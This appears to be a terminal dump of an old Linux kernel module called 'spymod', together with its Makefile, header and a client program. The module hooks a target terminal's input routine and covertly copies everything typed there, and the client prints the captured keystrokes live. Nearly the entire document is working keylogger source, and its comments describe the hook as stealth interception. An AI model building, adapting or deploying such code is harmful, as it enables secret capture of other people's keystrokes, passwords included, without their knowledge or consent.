/*
 * Copyright (c) 2004 Murr (murrych@yandex.ru).  All Rights Reserved.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of version 2 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it would be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * Further, this software is distributed without any warranty that it is
 * free of the rightful claim of any third person regarding infringement
 * or the like.  Any license provided herein, whether implied or
 * otherwise, applies only to this software file.  Patent licenses, if
 * any, provided herein do not apply to combinations of this program with
 * other software, or any other product whatsoever.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write the Free Software Foundation, Inc., 59
 * Temple Place - Suite 330, Boston MA 02111-1307, USA.
 *
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/tty.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/errno.h>
#include <asm/uaccess.h>
#include "spyinc.h"

static unsigned char spybuf[SPYMOD_BUF_LEN];
static unsigned int  spybuflen = 0;
static spinlock_t    spybuflock = SPIN_LOCK_UNLOCKED;
DECLARE_WAIT_QUEUE_HEAD(spybuf_wq);

static struct file* spyed_tty_file = NULL;
#define spyed_tty ((struct tty_struct*)(spyed_tty_file->private_data))
static int spy_server_pid = 0;
void    (*saved_receive_routine)(struct tty_struct *, const unsigned char *, char *, int) = NULL;

spinlock_t lock = SPIN_LOCK_UNLOCKED;

/* Here we have to detach from a tty
   (remove the filter) and to mark
   module as ready for new spy requests */
static void spymod_spy_finish(void) {
    struct file* f;

    spin_lock(&lock);
    spyed_tty->ldisc.receive_buf = saved_receive_routine;
    mb();
    f = spyed_tty_file;
    spy_server_pid = 0;
    spin_unlock(&lock);
    fput(f);
}

/* Every tty struct has its own copy of ldisc, so
   changing ldisc can modify behaviour only of
   the original tty. So this routine is entered
   iff tty driver has to transfer some user input
   to line discipline on the spyed tty. */
static void spymod_hook_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count) {
    int     to_copy = -1;

    spin_lock(&lock);
    to_copy = MIN(SPYMOD_BUF_LEN - spybuflen, count); // AP: We must put user input in spy buffer wrt buffer size (be careful not to overflow buffer)
    memcpy (spybuf+spybuflen, cp, to_copy); // AP: Copy input to spy buffer
    spybuflen += to_copy;
    spin_unlock(&lock);

    saved_receive_routine(tty, cp, fp, count); // AP: Don't forget to transfer the input, otherwise it will get lost
    wake_up_interruptible(&spybuf_wq); // AP: spy buffer state (probably) could have changed, let's inform reader about that
}

static int is_tty(struct file* fp) {
    return (fp->private_data != 0); // AP: CODA and NFS handles will as well satisfy the condition
                                    //          TODO: we should have a better test if fp references tty
}

static int spymod_spy_start (int fd) {
    int err = 0;

    spin_lock(&lock);

    if (spy_server_pid) { // AP: Spy server is single-threaded by design and we're busy now
        err = -EBUSY;
        goto bye;
    }

    spyed_tty_file = fget(fd);
    if (!is_tty(spyed_tty_file)) { // AP: Do you want to spy on smth other than tty? :) Bye-bye then
        fput(spyed_tty_file);
        err = -ENOTTY;
        goto bye;
    }

    saved_receive_routine = spyed_tty->ldisc.receive_buf; // AP: Save the original receiver for stealth filtering between it and tty driver
    spy_server_pid = current->pid; // AP: Mark spy server busy (only thread by this pid will be serviced until it will expicitly detach)
    spyed_tty->ldisc.receive_buf = spymod_hook_receive_buf; // AP: Install the hook... from now we shall intercept all input from tty driver
    spybuflen = 0; // AP: Mark buffer empty (it contains no intercepted user input yet)

bye:
    spin_unlock(&lock);
    return err;
}

static int spydev_ioctl (struct inode *ip, struct file *fp, unsigned int cmd, unsigned long fd) {
    switch (cmd) {
        case SPYMOD_SPY_START_IOCTL: return spymod_spy_start(fd);
        case SPYMOD_SPY_FINISH_IOCTL: spymod_spy_finish(); return 0;
        default:;
    }
    return -EINVAL;
}

static ssize_t spystream_read (struct file *f, char * buf, size_t n, loff_t * pos) {
    int to_copy, err;
    char* temp_buf = NULL;

    if (current->pid != spy_server_pid) {
        err = -ENXIO;
        goto bye;
    }

    if (n <= 0) {
        err = 0;
        goto bye;
    }

    if ((err = wait_event_interruptible(spybuf_wq, spybuflen>0))) // AP: Wait until smth in the buffer
        goto bye;

    temp_buf = kmalloc(MIN(n,SPYMOD_BUF_LEN), GFP_KERNEL); // AP: We should cut user input from buffer under spin lock,
                                                            //  so that copy_to_user is unavailable. Temporary buffer is used instead.

    spin_lock(&spybuflock);
    to_copy = MIN(n,spybuflen); // to_copy is always non-zero, because n>0 and spybuflen can not
                                // get reduced by someone outside spystream_read
    memcpy(temp_buf, spybuf, to_copy); // AP: Copy user input to temporary buffer
    memmove(spybuf+to_copy, spybuf, spybuflen-to_copy); // AP: Cut user input from spy buffer
    spybuflen -= to_copy;
    *pos += to_copy; // AP: Perhaps, VFS could need it
    spin_unlock(&spybuflock);

    if (copy_to_user(buf, temp_buf, to_copy)) // AP: Finally transfer input to the user buffer
        err = -EFAULT;
    else err = to_copy;

    kfree(temp_buf);

bye:
    return err;
}

static struct file_operations spymod_fops = {
    .ioctl = spydev_ioctl
};

static struct file_operations spystream_fops = {
    .read = spystream_read
};

static int spymod_init(void) {

    if (register_chrdev (SPYMOD_MAJOR, "spydev", &spymod_fops) != 0 ||
        register_chrdev (SPYSTREAM_MAJOR, "spystream", &spystream_fops) != 0) {
            printk ("SPYMOD: failed to register spy devices!\n");
            return -EBUSY;
    }

    printk ("SPYMOD module version 1.1 loaded.\n");
    return 0;
}

static void spymod_exit(void) {
    if (unregister_chrdev (SPYMOD_MAJOR, "spydev") != 0 ||
        unregister_chrdev (SPYSTREAM_MAJOR, "spystream") != 0) {
            printk ("SPYMOD: failed to unregister spy devices! Please contact author!\n");
    }
    printk ("SPYMOD module unloaded.\n");
}

module_init(spymod_init);
module_exit(spymod_exit);
MODULE_LICENSE("GPL");




[root@murmillo spymod]# cat Makefile
spy:kmod_build spyclient

spyclient: spyclient.c spyinc.h
        gcc -o spyclient spyclient.c

clean:
        rm -f spymod.ko spymod.o spyclient

obj-m            = spymod.o
spyclient-objs   = spymod.o
spyclient-hdrs   = spyinc.h

KDIR            = /lib/modules/`uname -r`/build
PWD             = $(shell pwd)

spyclient-cfiles    = ${spymod-objs:.o=.c}

kmod_build:: $(spymod-cfiles) $(spymod-hdrs)
        $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules


[root@murmillo spymod]# cat spyinc.h
/*
 * Copyright (c) 2003 Murr (murrych@yandex.ru).  All Rights Reserved.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of version 2 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it would be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * Further, this software is distributed without any warranty that it is
 * free of the rightful claim of any third person regarding infringement
 * or the like.  Any license provided herein, whether implied or
 * otherwise, applies only to this software file.  Patent licenses, if
 * any, provided herein do not apply to combinations of this program with
 * other software, or any other product whatsoever.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write the Free Software Foundation, Inc., 59
 * Temple Place - Suite 330, Boston MA 02111-1307, USA.
 *
 */

#define SPYMOD_MAJOR 222
#define SPYSTREAM_MAJOR 223

#define SPYMOD_SPY_START_IOCTL 0xFEFA
#define SPYMOD_SPY_FINISH_IOCTL 0xFAFE

#define SPYMOD_BUF_LEN 256

#define MIN(x,y) ((x)>(y)?(y):(x))

#ifndef __KERNEL__
#include <stdio.h>
static inline int open_dev (dev_t dev, mode_t mode) {
    char * str = tmpnam(NULL), * name;
    int fd;

    name = alloca(strlen(str)+1);
    strcpy(name, str);
    if (mknod(name, mode, dev) == -1)
        return 0;

    fd = open(name, O_RDWR);
    if (fd == -1)
        return 0;

    unlink(name);
    return fd;
}
#endif

[root@murmillo spymod]# cat spyclient.c
/*
 * Copyright (c) 2003 Murr (murrych@yandex.ru).  All Rights Reserved.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of version 2 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it would be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * Further, this software is distributed without any warranty that it is
 * free of the rightful claim of any third person regarding infringement
 * or the like.  Any license provided herein, whether implied or
 * otherwise, applies only to this software file.  Patent licenses, if
 * any, provided herein do not apply to combinations of this program with
 * other software, or any other product whatsoever.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write the Free Software Foundation, Inc., 59
 * Temple Place - Suite 330, Boston MA 02111-1307, USA.
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/stat.h>
#include "spyinc.h"

volatile int ready = 1;

void usage () {
    printf ("Spyclient version 1.0. Copyright (c) Murr.\n");
    printf ("usage: spyclient ttydev\n\n");
}

void client_sa_handler (int unused) {
    ready = 0;
}

int main (int argc, char * argv[]) {
    int  spymod, spystream, ttyfd;
    int  rc;
    char buf;

    sigset_t ss;

    if (argc != 2) {
        printf ("spyclient: invalid arguments\n");
        usage  ();
        goto __fatal;
    }

    if ((spymod = open_dev (SPYMOD_MAJOR<<8+0, 0600|S_IFCHR)) == 0) {
        printf ("spyclient: failed to open SPYMOD device! (is the module loaded?)\n");
        usage  ();
        goto __fatal;
    }

    if ((spystream = open_dev (SPYSTREAM_MAJOR<<8+0, 0600|S_IFCHR)) == 0) {
        printf ("spyclient: failed to open SPYSTREAM device! (is the module loaded?)\n");
        usage  ();
        goto __fatal_spystream;
    }

    ttyfd = open (argv[1], O_RDWR);
    if (ttyfd == -1) {
        printf ("spyclient: failed to open tty '%s'!\n", argv[1]);
        usage  ();
        goto __fatal_tty;
    }

    if (!isatty (ttyfd)) {
        printf ("spyclient: '%s' is not a tty!\n", argv[1]);
        usage  ();
        goto __fatal_other;
    }

    rc = ioctl (spymod, SPYMOD_SPY_START_IOCTL, ttyfd);
    if (rc == -1) {
        printf ("spyclient: failed attach to SPYMOD stream!\n");
        usage  ();
        goto __fatal_other;
    }

    sigemptyset (&ss);
    sigaction (SIGINT, &(const struct sigaction){.sa_handler = client_sa_handler, .sa_mask = ss, .sa_flags = SA_ONESHOT}, NULL);

    while (ready) {
        read (spystream, &buf, 1);
        printf ("['%c'(%x)] ", isprint(buf)?buf:' ', (short)buf);
        fflush (stdout);
    }

    if (ioctl (spymod, SPYMOD_SPY_FINISH_IOCTL, ttyfd) != -1)
        printf ("\nspyclient: successfully detached... Have a nice day!\n");
    else printf ("\nspyclient: failed to detach from SPYMOD stream! Please contact author!\n");


__fatal_other:
    close (ttyfd);

__fatal_tty:
    close (spystream);

__fatal_spystream:
    close (spymod);

__fatal:
    return 1;
}